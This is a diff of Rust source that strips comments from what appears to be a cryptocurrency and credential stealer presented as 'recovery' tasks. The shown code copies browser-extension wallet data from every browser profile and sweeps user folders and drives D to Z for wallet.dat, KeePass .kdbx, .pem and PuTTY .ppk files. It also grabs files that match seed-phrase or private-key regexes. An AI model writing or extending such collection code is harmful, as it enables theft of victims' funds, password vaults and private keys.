@@ -15,7 +15,7 @@ use walkdir::WalkDir;
 pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     vec![
         Arc::new(CryptoWalletTask::new(ctx)),
-        Arc::new(ExtensionWalletTask::new(ctx)), // New: Browser Extensions
+        Arc::new(ExtensionWalletTask::new(ctx)),
         Arc::new(WalletPatternSearchTask::new(ctx)),
         Arc::new(SeedPhraseDiscoveryTask::new(ctx)),
         wallet_inventory_task(ctx),
@@ -169,8 +169,6 @@ impl RecoveryTask for WalletInventoryTask {
     }
 }
 
-// --- Desktop Wallets ---
-
 struct CryptoWalletTask {
     specs: Vec<WalletSpec>,
 }
@@ -274,8 +272,6 @@ fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
         .collect()
 }
 
-// --- Browser Extension Wallets ---
-
 struct ExtensionWalletTask {
     local_app_data: PathBuf,
 }
@@ -332,7 +328,6 @@ impl RecoveryTask for ExtensionWalletTask {
                 continue;
             }
 
-            // Check Default and Profile * folders
             let mut profiles = vec![user_data.join("Default")];
             if let Ok(mut entries) = fs::read_dir(&user_data).await {
                 while let Ok(Some(entry)) = entries.next_entry().await {
@@ -356,7 +351,6 @@ impl RecoveryTask for ExtensionWalletTask {
                         let label = format!("Ext_{}_{}", browser_name, wallet_name);
                         let dest_root = wallet_output_dir(ctx, &label).await?;
                         
-                        // Copy the LevelDB folder
                         copy_dir_limited(&ext_path, &dest_root, &label, &mut artifacts, usize::MAX, 0).await?;
                     }
                 }
@@ -366,9 +360,6 @@ impl RecoveryTask for ExtensionWalletTask {
         Ok(artifacts)
     }
 }
-
-
-// --- Pattern & Seed Discovery ---
 
 struct WalletPatternSearchTask {
     user_roots: Vec<PathBuf>,
@@ -387,7 +378,6 @@ impl WalletPatternSearchTask {
         user_roots.retain(|p| p.exists());
 
         let mut drive_roots = Vec::new();
-        // Simple heuristic: check drives D-Z
         for b in b'D'..=b'Z' {
             let drive = format!("{}:\\", b as char);
             let path = PathBuf::from(&drive);
@@ -407,10 +397,10 @@ const TARGET_PATTERNS: &[&str] = &[
     "wallet.dat",
     "default_wallet",
     "UTC--",
-    ".kdbx", // KeePass
+    ".kdbx",
     ".key",
     ".pem",
-    ".ppk", // Putty Private Key
+    ".ppk",
     "wallet.json",
     ".wallet",
 ];
@@ -448,12 +438,12 @@ impl RecoveryTask for WalletPatternSearchTask {
 
         for root in &self.user_roots {
             let root = root.clone();
-            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 10))); // Deep scan user dirs
+            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 10)));
         }
 
         for root in &self.drive_roots {
             let root = root.clone();
-            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 4))); // Shallow scan drives
+            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 4)));
         }
 
         for handle in handles {
@@ -482,7 +472,6 @@ fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
         }
         let name = entry.file_name().to_string_lossy();
         if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
-            // Additional check: skip if file size > 50MB (likely not a wallet)
             if entry.metadata().map(|m| m.len()).unwrap_or(0) < 50 * 1024 * 1024 {
                 found.push(entry.path().to_path_buf());
             }
@@ -529,9 +518,7 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
         let mut artifacts = Vec::new();
         let dest_root = wallet_output_dir(ctx, "Seeds").await?;
 
-        // 12-24 word BIP39 phrase
         let bip39_regex = Regex::new(r"(?i)\b([a-z]{3,}\s+){11,23}[a-z]{3,}\b").unwrap();
-        // Private Key (Basic Heuristic: 64 hex chars or WIF-like starts with 5, L, K)
         let priv_key_regex = Regex::new(r"\b([a-fA-F0-9]{64})|([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b").unwrap();
         
         let target_names = ["seed", "mnemonic", "phrase", "backup", "crypto", "wallet", "secret", "private", "key", "pass"];
@@ -556,7 +543,6 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
                     .to_string_lossy()
                     .to_lowercase();
 
-                // Check extension
                 let has_target_ext = target_exts.iter().any(|&ext| name_lower.ends_with(ext));
                 if !has_target_ext {
                      continue;
@@ -564,15 +550,13 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
                 
                 let mut should_grab = false;
 
-                // 1. Filename heuristic
                 if target_names.iter().any(|&s| name_lower.contains(s)) {
                     should_grab = true;
                 }
 
-                // 2. Content Scan (only for small text-like files)
                 if !should_grab && (name_lower.ends_with(".txt") || name_lower.ends_with(".md") || name_lower.ends_with(".log") || name_lower.ends_with(".json")) {
                     if let Ok(meta) = fs::metadata(path).await {
-                        if meta.len() < 1024 * 50 { // < 50KB
+                        if meta.len() < 1024 * 50 {
                             if let Ok(content) = fs::read_to_string(path).await {
                                 if bip39_regex.is_match(&content) || priv_key_regex.is_match(&content) {
                                     should_grab = true;
